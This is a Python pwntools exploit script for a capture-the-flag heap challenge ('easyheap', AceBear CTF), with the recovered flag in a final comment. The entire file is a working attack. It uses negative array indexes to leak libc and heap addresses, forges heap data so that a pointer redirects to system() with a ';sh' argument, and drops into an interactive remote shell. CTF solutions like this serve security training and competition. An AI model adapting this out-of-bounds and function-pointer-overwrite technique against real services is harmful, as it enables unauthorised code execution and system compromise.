from pwn import *

#env = {"LD_PRELOAD":"./easy.so.6"}
#r = process("./easy")
r = remote("easyheap.acebear.site", 3002)

def createName(idx, name):
	r.sendline("1")
	print r.recvuntil("Index: ")
	r.sendline(str(idx))
	print r.recvuntil("name: ")
	r.send(name)
	print r.recvuntil("choice: ")

def deleteName(idx):
	r.sendline("3")
	print r.recvuntil("Index: ")
	r.sendline(str(idx))
	print r.recvuntil("choice: ")

def showName(idx):
	r.sendline("4")
	print r.recvuntil("Index: ")
	r.sendline(str(idx))
	r.recvuntil("is: ")
	rv = r.recvuntil("\n")[:-1]
	print r.recvuntil("choice:")
	return rv

def editName(idx, dt):
	r.sendline("2")
	print r.recvuntil("Index: ")
	r.sendline(str(idx))
	print r.recvuntil("name: ")
	r.send(dt)
	print r.recvuntil("choice: ")

print r.recvuntil("name: ")
r.sendline("AAAABBBBCCCCDDDD" + p32(0x804b0e0))

print r.recvuntil("age: ")
r.sendline("18")
print r.recvuntil("choice: ")

rv = showName(-8)

libc = u32(rv[4:8])
#libc_base = libc - 0x1b25e7
libc_base = libc - 0x1b05e7
system = libc_base + 0x3a940
#system = libc_base + 0x3ada0

print hex(libc)

createName(0, "asdf")
createName(1, "asdf")
createName(2, "asdf")
deleteName(0)
deleteName(1)
deleteName(2)

rv = showName(2)
heap = u32(rv)

createName(0, "A"*32)
createName(1, "B"*12 + "B"*17+";sh")
createName(2, "C"*32)

createName(3, "AAAA"+p32(heap)+"a"*24)

createName(4, "aaaabbbb" + p32(system) + "E"*20)
createName(5, "F"*32)
createName(6, "aaaabbbbccccddddeeeeffffg" + p32(heap+0x6c) + "hhh")

print "heap: " + hex(heap)
print "system: " + hex(system)

raw_input("$")

r.sendline("2")
print r.recvuntil("Index")
r.sendline("-2470")
print r.recvuntil("name")
r.send(p32(heap+0x14)*2)

r.interactive()

# AceBear{m4yb3_h34p_i5_3a5y_f0r_y0u}